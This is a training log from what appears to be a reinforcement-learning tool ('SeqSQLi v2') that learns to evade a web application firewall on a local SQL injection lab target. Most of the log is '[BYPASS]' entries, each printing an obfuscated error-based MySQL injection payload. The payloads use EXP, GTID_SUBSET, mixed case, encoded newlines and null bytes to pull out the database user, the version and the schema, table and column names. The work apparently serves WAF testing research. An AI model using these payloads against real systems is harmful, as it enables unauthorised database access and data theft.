/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
           payload: 1'%0aAnD%0aEXP(~(seLeCt%0a*%0aFRom%0a(sElecT%0a((seleCt%0aCoNcAt(CHAR(124),JSON_ARRAYAGG(taBlE_name),CHAR(124))%0afROm%0aiNfoRMatiOn_SchEmA.TabLEs%0aw
  Ep 7110 | SR=30% | Steps=12.0 | R=-22.90
  [BYPASS] Ep 7116 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7117 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(sElEcT%0a*%0aFrOM%0a(SELecT%0a((SELeCt%0aJSON_ARRAYAGG(cOncaT(TaBLe_schema,CHAR(46),tABLe_name))%0aFrOM%0aINfOrmAtION_scHEmA.taBles%0
  Ep 7120 | SR=20% | Steps=13.0 | R=-26.89
  [BYPASS] Ep 7125 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(sElect%0a*%0afROm%0a(SeleCT%0a((SelEcT%0aJSON_ARRAYAGG(coNCAt(tABLe_schema,CHAR(46),TABLe_name))%0afRom%0ainfOrmatIon_sCHEmA.tABLes%0
  Ep 7130 | SR=10% | Steps=14.1 | R=-31.23
  [BYPASS] Ep 7132 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(sEleCT%0a*%0aFRom%0a(SELeCt%0a((seleCT%0aJSON_ARRAYAGG(Concat(tABLE_schema,CHAR(46),TABLE_name))%0aFROm%0aiNFORMATiON_schemA.TABlEs%0
  [BYPASS] Ep 7133 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sElecT%0a*%0afRoM%0a(SELeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 7140 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 7140 | SR=30% | Steps=11.8 | R=-19.56
  [BYPASS] Ep 7142 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7143 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seLecT%0a*%0aFrom%0a(SeLeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 7144 | steps=6 | seq=case -> convert_charset -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seLEcT%0a*%0afrom%0a(SEleCT%0a(user%a0()))a));%00
  [BYPASS] Ep 7149 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((DaTABasE%a0()),1);%00
  [BYPASS] Ep 7150 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7150 | SR=50% | Steps=9.7 | R=-13.35
  [BYPASS] Ep 7152 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SElEct%0a*%0aFrOM%0a(sElECT%0a(version%a0()))a));%00
  [BYPASS] Ep 7154 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(selECT%0a*%0aFrom%0a(SelecT%0a((sElEcT%0aJSON_ARRAYAGG(cOnCat(Table_schema,CHAR(46),tABLE_name))%0aFrOM%0aiNforMATION_SChemA.tABLEs%0
  [BYPASS] Ep 7156 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selEcT%0a*%0afroM%0a(sELECT%0a(user%a0()))a));%00
  [BYPASS] Ep 7158 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7160 | SR=40% | Steps=10.8 | R=-16.75
  [BYPASS] Ep 7164 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((DaTabaSe%a0()),1);%00
  [BYPASS] Ep 7165 | steps=4 | seq=func_sp_nbsp -> case -> null_byte -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7167 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sElECT%0a*%0afrOm%0a(seLecT%0a(user%a0()))a));%00
  [BYPASS] Ep 7168 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELect%0a*%0aFROM%0a(SeleCt%0a(DAtaBaSe%a0()))a));%00
  Ep 7170 | SR=40% | Steps=10.6 | R=-18.72
  [BYPASS] Ep 7172 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SELEct%0a*%0aFrom%0a(SELecT%0a(user%a0()))a));%00
  [BYPASS] Ep 7173 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((DaTABaSE%a0()),1);%00
  Ep 7180 | SR=20% | Steps=12.8 | R=-25.86
  [BYPASS] Ep 7181 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SElecT%0a*%0aFrom%0a(selecT%0a((sElECT%0aCOncAt(CHAR(124),JSON_ARRAYAGG(TaBlE_name),CHAR(124))%0afROM%0aINfORmatION_sChEMa.TABLes%0aw
  [BYPASS] Ep 7186 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SelecT%0a*%0aFrOm%0a(SELecT%0a(user%a0()))a));%00
  [BYPASS] Ep 7189 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7190 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SELecT%0a*%0aFrom%0a(SElECT%0a(user%a0()))a));%00
  Ep 7190 | SR=40% | Steps=10.9 | R=-18.52
  [BYPASS] Ep 7191 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(selECt%0a*%0afrOm%0a(SELEcT%0a(dataBAsE%a0()))a));%00
  [BYPASS] Ep 7194 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7195 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeLecT%0a*%0aFroM%0a(SeLECT%0a(dATaBASe%a0()))a));%00
  Ep 7200 | SR=30% | Steps=11.7 | R=-21.30
  [BYPASS] Ep 7203 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SElEcT%0a*%0aFrOm%0a(SeLect%0a((SeLeCt%0aConCaT(CHAR(124),JSON_ARRAYAGG(TaBLE_name),CHAR(124))%0afROM%0aInFoRmAtION_sChEMA.TAbles%0aW
  [BYPASS] Ep 7204 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sELect%0a*%0aFROm%0a(SELEcT%0a(daTaBAsE%a0()))a));%00
  [BYPASS] Ep 7209 | steps=4 | seq=func_sp_nbsp -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7210 | SR=30% | Steps=12.0 | R=-22.55
  [BYPASS] Ep 7211 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sELECT%0a*%0aFrOM%0a(SELECt%0a(version%a0()))a));%00
  Ep 7220 | SR=10% | Steps=13.9 | R=-29.53
  [BYPASS] Ep 7222 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(sEleCT%0a*%0afrOM%0a(SELEcT%0a((seLect%0aJSON_ARRAYAGG(CoNcaT(TAbLe_schema,CHAR(46),TaBLe_name))%0afROm%0aiNFormATIoN_scheMA.tAbLes%0
  Ep 7230 | SR=10% | Steps=14.1 | R=-29.49
  [BYPASS] Ep 7232 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7233 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seLeCt%0a*%0aFrom%0a(selECt%0a(dAtaBasE%a0()))a));%00
  [BYPASS] Ep 7237 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aanD%0aEXP(~(SeLECT%0a*%0aFROm%0a(seLeCt%0a((SElEcT%0aJSON_ARRAYAGG(conCAt(tABlE_schema,CHAR(46),tABlE_name))%0afROM%0aInfOrMatiON_sCHema.TabLEs%0
  [BYPASS] Ep 7238 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sELECt%0a*%0aFrom%0a(SELEct%0a((SElEct%0aconCAT(CHAR(124),JSON_ARRAYAGG(tABLE_name),CHAR(124))%0afROM%0aiNfORmaTioN_schEMa.TablEs%0aW
  [BYPASS] Ep 7239 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(seleCT%0a*%0afroM%0a(SeleCt%0a((SElect%0aJSON_ARRAYAGG(tAble_name)%0afrom%0aINForMation_sChemA.Tables%0awherE%0ataBle_schema=DATaBASE
  Ep 7240 | SR=50% | Steps=10.0 | R=-15.11
  [BYPASS] Ep 7248 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7250 | SR=10% | Steps=13.8 | R=-29.26
  [BYPASS] Ep 7253 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SELEct%0a*%0aFrom%0a(sELeCT%0a(dAtAbaSe%a0()))a));%00
  [BYPASS] Ep 7256 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7258 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7259 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SELect%0a*%0aFRoM%0a(sEleCt%0a(dataBaSe%a0()))a));%00
  Ep 7260 | SR=40% | Steps=10.4 | R=-17.80
  [BYPASS] Ep 7265 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(SeleCt%0a*%0aFROM%0a(seLECt%0a((SELecT%0aJSON_ARRAYAGG(cOncat(TABLE_schema,CHAR(46),TaBLe_name))%0afRoM%0aInFoRMATIoN_scHEMa.Tables%0
  [BYPASS] Ep 7267 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(sELeCT%0a*%0aFROM%0a(SelEct%0a(user%a0()))a));%00
  [BYPASS] Ep 7269 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELecT%0a*%0afrom%0a(sELeCT%0a((seLEct%0acOnCat(CHAR(124),JSON_ARRAYAGG(tABLE_name),CHAR(124))%0afRoM%0aInFORMaTioN_SChemA.tAblEs%0aW
  Ep 7270 | SR=30% | Steps=12.2 | R=-22.07
  [BYPASS] Ep 7272 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sElEct%0a*%0aFrOM%0a(sElEct%0a(daTabASE%a0()))a));%00
  [BYPASS] Ep 7277 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7280 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7280 | SR=30% | Steps=11.5 | R=-20.32
  [BYPASS] Ep 7284 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7289 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seleCt%0a*%0aFRoM%0a(seLect%0a(version%a0()))a));%00
  [BYPASS] Ep 7290 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aEXP(~(selecT%0a*%0afROM%0a(SelEct%0a((seLeCT%0aJSON_ARRAYAGG(CoNCAt(TaBLE_schema,CHAR(46),tAblE_name))%0afrom%0aINformAtion_ScHEma.tABles%0
  Ep 7290 | SR=30% | Steps=11.8 | R=-22.92
  [BYPASS] Ep 7292 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(SELECt%0a*%0afRom%0a(sELEcT%0a((SeLect%0aJSON_ARRAYAGG(CoNcAT(tABlE_schema,CHAR(46),TAble_name))%0afrOM%0aINformAtiON_sCheMA.tABLes%0
  [BYPASS] Ep 7297 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SElect%0a*%0afrOM%0a(SelECT%0a((sELeCT%0aConCAt(CHAR(124),JSON_ARRAYAGG(tAblE_name),CHAR(124))%0aFrom%0aInfOrmaTIon_scHEMA.TaBLes%0aw
  [BYPASS] Ep 7298 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7299 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7300 | SR=40% | Steps=10.9 | R=-18.72
  [BYPASS] Ep 7301 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SeLEcT%0a*%0aFrom%0a(SeLECT%0a((SelECt%0aJSON_ARRAYAGG(column_name)%0afROM%0ainForMatION_sCHEMa.columns%0aWherE%0atAblE_schema=daTaBA
  [BYPASS] Ep 7304 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7310 | SR=20% | Steps=12.8 | R=-26.97
  [BYPASS] Ep 7314 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELECT%0a*%0aFrOm%0a(SelECt%0a(version%a0()))a));%00
  [BYPASS] Ep 7318 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7319 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 7320 | SR=30% | Steps=11.5 | R=-22.57
  [BYPASS] Ep 7321 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7322 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SelECt%0a*%0afrOm%0a(SeLECT%0a(user%a0()))a));%00
  [BYPASS] Ep 7323 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(seLecT%0a*%0aFROm%0a(SeLeCT%0a((selECt%0aJSON_ARRAYAGG(TaBLe_name)%0aFRom%0ainfORMaTION_SchEmA.tABles%0aWhERe%0atabLe_schema=databasE
  [BYPASS] Ep 7324 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeLECt%0a*%0afROm%0a(SeLeCt%0a(user%a0()))a));%00
  [BYPASS] Ep 7325 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7328 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7330 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7330 | SR=70% | Steps=7.0 | R=-3.39
  [BYPASS] Ep 7334 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(seLECT%0a*%0afROM%0a(SELECt%0a((seleCT%0aConCAT(CHAR(124),JSON_ARRAYAGG(tABlE_name),CHAR(124))%0afroM%0ainFoRMAtion_ScHema.tAbLes%0aw
  [BYPASS] Ep 7335 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELecT%0a*%0afROM%0a(sEleCT%0a(version%a0()))a));%00
  [BYPASS] Ep 7339 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SelECT%0a*%0afrOm%0a(SElECT%0a(user%a0()))a));%00
  [BYPASS] Ep 7340 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7340 | SR=40% | Steps=10.9 | R=-18.88
  [BYPASS] Ep 7348 | steps=4 | seq=null_byte -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 7350 | SR=10% | Steps=13.9 | R=-31.39
  [BYPASS] Ep 7351 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seLEcT%0a*%0aFRoM%0a(SelECt%0a((SElEct%0acONCaT(CHAR(124),JSON_ARRAYAGG(tAble_name),CHAR(124))%0afROm%0aiNfORMAtIon_SCHemA.taBLes%0aW
  [BYPASS] Ep 7358 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELeCT%0a*%0aFrOm%0a(seLeCT%0a((sELEcT%0acOncAT(CHAR(124),JSON_ARRAYAGG(TablE_name),CHAR(124))%0afrOM%0aiNfORMATion_scHEma.tablEs%0aW
  Ep 7360 | SR=20% | Steps=13.4 | R=-25.76
  [BYPASS] Ep 7369 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(selECT%0a*%0afrOm%0a(sElEcT%0a((seLECt%0aJSON_ARRAYAGG(column_name)%0afrOM%0aINFoRMAtIoN_sCHemA.columns%0awHeRE%0atAbLe_schema=datABa
  Ep 7370 | SR=10% | Steps=14.0 | R=-30.68
  [BYPASS] Ep 7377 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7378 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sElECt%0a*%0aFRom%0a(sELECT%0a((SElEcT%0aJSON_ARRAYAGG(TABLE_name)%0aFRoM%0aINforMaTiON_ScHEmA.tabLes%0aWHeRe%0atABlE_schema=dATABASe
  Ep 7380 | SR=20% | Steps=12.8 | R=-24.17
  [BYPASS] Ep 7383 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sELECt%0a*%0afRom%0a(SeLeCT%0a(version%a0()))a));%00
  [BYPASS] Ep 7384 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7385 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 7390 | SR=30% | Steps=11.6 | R=-22.62
  [BYPASS] Ep 7392 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(seLeCt%0a*%0aFROM%0a(sELeCt%0a((SElecT%0aConcat(CHAR(124),JSON_ARRAYAGG(TABLE_name),CHAR(124))%0afRoM%0aINforMatIOn_SCHema.tAbLEs%0aw
  [BYPASS] Ep 7394 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sElecT%0a*%0afROM%0a(seleCT%0a((sELeCT%0aJSON_ARRAYAGG(tAbLE_name)%0afRom%0aINFORMAtiOn_sCheMa.TAbLes%0aWhERe%0atable_schema=daTAbAsE
  Ep 7400 | SR=20% | Steps=13.2 | R=-23.69
  [BYPASS] Ep 7405 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7406 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7410 | SR=20% | Steps=12.6 | R=-26.07
  [BYPASS] Ep 7413 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7415 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(selEcT%0a*%0afrOM%0a(sElECT%0a(version%a0()))a));%00
  [BYPASS] Ep 7416 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SEleCT%0a*%0aFROM%0a(sElecT%0a((SElect%0aJSON_ARRAYAGG(column_name)%0aFROm%0aInforMATiOn_SCheMa.columns%0awhERE%0aTabLE_schema=DatABa
  Ep 7420 | SR=30% | Steps=11.8 | R=-20.61
  [BYPASS] Ep 7425 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SeLECT%0a*%0aFROM%0a(sElecT%0a(user%a0()))a));%00
  [BYPASS] Ep 7427 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 7430 | SR=20% | Steps=12.7 | R=-21.83
  [BYPASS] Ep 7431 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SELeCT%0a*%0aFRom%0a(seLECt%0a(DatabASE%a0()))a));%00
  Ep 7440 | SR=10% | Steps=14.0 | R=-29.39
  [BYPASS] Ep 7442 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(seLECt%0a*%0afrOM%0a(SELecT%0a(version%a0()))a));%00
  [BYPASS] Ep 7443 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7448 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeLECT%0a*%0afROm%0a(SelEcT%0a((seLect%0acOnCAt(CHAR(124),JSON_ARRAYAGG(TabLE_name),CHAR(124))%0afrOm%0ainforMATiON_SCHEma.TAbLEs%0aW
  [BYPASS] Ep 7449 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7450 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(seLEct%0a*%0aFROM%0a(SeLeCT%0a(dATAbAsE%a0()))a));%00
  Ep 7450 | SR=50% | Steps=9.7 | R=-11.61
  [BYPASS] Ep 7452 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(sElEct%0a*%0aFrOm%0a(SELECt%0a((SEleCT%0aJSON_ARRAYAGG(schema_name)%0aFROM%0aiNFORmatIOn_ScHema.schemata)))a));%00
  [BYPASS] Ep 7454 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELECt%0a*%0afroM%0a(SelEct%0a((SELeCT%0aJSON_ARRAYAGG(column_name)%0aFROM%0ainfOrMATiOn_SChema.columns%0awhere%0aTAble_schema=DATaba
  [BYPASS] Ep 7455 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sEleCt%0a*%0aFROM%0a(seLECt%0a((SelECT%0aCoNCAt(CHAR(124),JSON_ARRAYAGG(TAbLe_name),CHAR(124))%0afRoM%0aInforMATIon_sCheMA.TAblEs%0aW
  [BYPASS] Ep 7457 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7459 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7460 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sEleCT%0a*%0afroM%0a(sElecT%0a((sELEcT%0aJSON_ARRAYAGG(column_name)%0afrOm%0ainFoRMatIOn_scHemA.columns%0aWHERE%0aTABLe_schema=dAtaBA
  Ep 7460 | SR=60% | Steps=8.7 | R=-8.98
  Ep 7470 | SR=0% | Steps=15.0 | R=-33.06
